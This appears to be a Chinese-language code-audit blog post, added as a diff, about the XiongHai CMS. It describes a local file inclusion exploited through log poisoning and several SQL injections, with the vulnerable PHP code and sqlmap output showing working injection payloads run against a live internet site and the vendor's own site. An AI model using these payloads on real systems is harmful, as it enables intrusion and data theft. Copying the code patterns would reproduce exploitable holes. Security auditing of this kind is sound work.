@@ -1,0 +1,153 @@
+title: 熊海cms 代码审计
+date: 2015-03-24 16:24:05
+tags:
+---
+
+
+官网：http://www.isea.pw/
+#问题一：本地文件包含
+
+	<?php
+	//单一入口模式
+	error_reporting(0); //关闭错误显示
+	$file=addslashes($_GET['r']); //接收文件名
+	$action=$file==''?'index':$file; //判断为空或者等于index
+	echo $action;
+	include('files/'.$action.'php'); //载入相应文件
+	?>
+
+典型的本地文件包含，get的r参数直接进入了include函数。但是由于后面拼接了php后缀，所以需要\00截断。所以利用条件是gpc为off，php版本低于5.3.4
+
+
+本地直接去掉php拼接做测试。因为没有上传文件的地方。所以通过包含apache日志进行利用。
+
+
+直接使用burpsuie发送含有利用poc的php代码到服务器。使用浏览器的话会对代码中的空格等字符进行编码，所以需要使用burpsuite直接发送。
+
+![phpinfo](/images/baohan2ng)
+
+然后包含apache日志。
+
+![phpinfo](/images/baohan1.png)
+
+
+修复方案：
+
+$action 使用白名单，只允许全为字母的字符串即可。
+
+#问题二： 多处SQL注入
+
+该cms采取的方式是在接受数据的时候进行addslash操作。这种方式已经是比较落后的安全防御方法了。
+
+<!-- ![phpinfo]() -->
+
+同一语句引起的2处SQL注入1：
+
+software.php line 3
+
+	$query = "SELECT * FROM settings";
+	$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
+	$info = mysql_fetch_array($resul);
+	$id=addslashes($_GET['cid']);
+	$query = "SELECT * FROM download WHERE id='$id'";
+	$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
+	$download = mysql_fetch_array($resul);
+
+	//浏览计数
+	$query = "UPDATE download SET hit = hit+1 WHERE id=$id";
+	@mysql_query($query) or die('修改错误：'.mysql_error());
+	?>
+
+
+	$query = "UPDATE download SET hit = hit+1 WHERE id=$id";
+
+忘记加单引号保护导致存在sql注入。同样的逻辑在content.php line 20 也存在。
+
+互联网实例测试：
+
+	GET parameter 'cid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+	sqlmap identified the following injection points with a total of 456 HTTP(s) requests:
+	---
+	Parameter: cid (GET)
+	    Type: boolean-based blind
+	    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+	    Payload: r=software&cid=3 RLIKE (SELECT (CASE WHEN (9591=9591) THEN 3 ELSE 0x28 END))
+
+	    Type: error-based
+	    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+	    Payload: r=software&cid=3 AND (SELECT 5383 FROM(SELECT COUNT(*),CONCAT(0x7178787671,(SELECT (ELT(5383=5383,1))),0x7171707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+	---
+	[17:13:37] [INFO] the back-end DBMS is MySQL
+	web server operating system: Windows 2003 or XP
+	web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
+	back-end DBMS: MySQL 5.0
+	[17:13:37] [INFO] fetching database names
+	[17:13:39] [INFO] the SQL query used returns 2 entries
+	[17:13:39] [INFO] retrieved: information_schema
+	[17:13:39] [INFO] retrieved: a0627192748
+
+官网也存在：
+
+![phpinfo](/images/guanwang1.png)
+
+另外4处SQL注入在submit.php文件
+
+	<?php
+	session_start();
+	require 'inc/conn.php';
+	$type=addslashes($_GET['type']);
+	$name=$_POST['name'];
+	$mail=$_POST['mail'];
+	$url=$_POST['url'];
+	$content=$_POST['content'];
+	$cid=$_POST['cid'];
+	$ip=$_SERVER["REMOTE_ADDR"];
+	$tz=$_POST['tz'];
+	if ($tz==""){$tz=0;}
+	$jz=$_POST['jz'];
+
+这里获取到的参数只对$_GET['type']做了过滤。所以后面使用到数据库的地方基本都存在SQL注入。
+
+第一处66行：
+
+	$query = "SELECT * FROM interaction WHERE( mail = '$mail')";
+
+第二处121行：
+
+	$query = "INSERT INTO interaction (
+	type,
+	xs,
+	cid,
+	name,
+	mail,
+	url,
+	touxiang,
+	shebei,
+	ip,
+	content,
+	tz,
+	date
+	) VALUES (
+	'$type',
+	'$xs',
+	'$cid',
+	'$name',
+	'$mail',
+	'$url',
+	'$touxiang',
+	'$shebei',
+	'$ip',
+	'$content',
+	'$tz',
+	now()
+	)";
+	@mysql_query($query) or die('新增错误：'.mysql_error());
+
+第四五处：176行和206行：
+
+	$query = "SELECT * FROM content WHERE( id= $cid)";
+
+![phpinfo](/images/bendi1.png)
+
+
+
